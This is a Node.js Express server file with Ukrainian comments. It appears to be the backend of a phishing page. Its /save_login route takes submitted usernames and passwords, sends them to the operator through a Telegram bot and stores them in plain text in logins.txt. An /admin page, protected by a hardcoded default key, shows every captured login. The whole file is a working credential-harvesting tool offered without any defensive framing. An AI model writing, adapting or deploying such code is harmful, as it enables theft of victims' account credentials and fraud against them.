// server.js// server.js
// ЗАЛИШ -- використовуй Node >=18 або встанови node-fetch для старих версій
// Якщо Node < 18: uncomment нижче і встанови node-fetch: npm install node-fetch
// const fetch = require('node-fetch');

const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();

const PORT = process.env.PORT || 3000;
const ADMIN_KEY = process.env.ADMIN_KEY || 'show81212';

// Telegram: токен бота і chat id (встановити в ENV)
const BOT_TOKEN = process.env.BOT_TOKEN;    // наприклад: 123456789:ABCDefGh...
const CHAT_ID = process.env.CHAT_ID;        // числовий chat_id (отримуємо інструкцією нижче)

if (!BOT_TOKEN || !CHAT_ID) {
  console.warn('Warning: BOT_TOKEN or CHAT_ID not set. Telegram notifications disabled.');
}

app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static(__dirname));

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// helper: send message to Telegram
async function sendTelegramMessage(text) {
  if (!BOT_TOKEN || !CHAT_ID) return;
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  const body = {
    chat_id: CHAT_ID,
    text,
    parse_mode: 'HTML'
  };

  // Node 18+ has global fetch
  try {
    if (typeof fetch === 'undefined') {
      // if fetch missing, try dynamic import of node-fetch (for older Node)
      const nf = await import('node-fetch');
      await nf.default(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body)
      });
    } else {
      await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body)
      });
    }
  } catch (err) {
    console.error('Telegram send error:', err);
  }
}

// Сейв логінів: надсилаємо в Telegram і додаємо у файл (файл опціонально)
app.post('/save_login', async (req, res) => {
  const { username, password } = req.body || {};
  if (!username || !password) {
    return res.status(400).send('Немає даних для збереження.');
  }

  const time = new Date().toISOString();
  // Рекомендовано НЕ надсилати plain password у повідомлення, але тут відправляємо як у прикладі.
  // Якщо хочеш безпечніше — маскуй частину пароля: password.replace(/.(?=.{2})/g, '*')
  const maskedPassword = password.length > 4 ? password.replace(/.(?=.{2})/g, '*') : '****';

  const text = `<b>New login saved</b>\nTime: ${time}\nUser: ${username}\nPass: ${maskedPassword}`;

  // Відправка в Telegram (не чекаємо помилки)
  sendTelegramMessage(text).catch(err => console.error(err));

  // Також запис у файл (опціонально; на безкоштовних хостингах може бути нестійким)
  const line = `${time} - ${username} : ${password}\n`;
  fs.appendFile(path.join(__dirname, 'logins.txt'), line, err => {
    if (err) {
      console.error('Write error:', err);
      // відповідаємо успішно, бо Telegram повідомлення може вдалось надіслати
      return res.status(200).send('Дані отримано (Telegram). Але не вдалося записати у файл.');
    }
    res.send('Дані збережено (Telegram + файл).');
  });
});

// Admin/form to view logins (POST)
app.get('/admin', (req, res) => {
  const html = `<!doctype html>
  <html><head><meta charset="utf-8"><title>Admin</title></head><body style="font-family:Arial,sans-serif;padding:20px;">
  <h2>Admin — показати логіни</h2>
  <form method="POST" action="/view_logins">
    <label>Секрет: <input name="key" type="password" autofocus></label>
    <button type="submit">Показати логіни</button>
  </form>
  </body></html>`;
  res.type('html').send(html);
});

app.post('/view_logins', (req, res) => {
  const key = (req.body.key || '').toString();
  if (!key || key !== ADMIN_KEY) return res.status(403).send('Access denied');

  const filePath = path.join(__dirname, 'logins.txt');
  fs.readFile(filePath, 'utf8', (err, data) => {
    if (err) {
      if (err.code === 'ENOENT') return res.type('text/plain').send('Файл logins.txt не знайдено.');
      console.error(err);
      return res.status(500).send('Помилка при читанні файлу.');
    }
    res.type('text/plain').send(data);
  });
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});


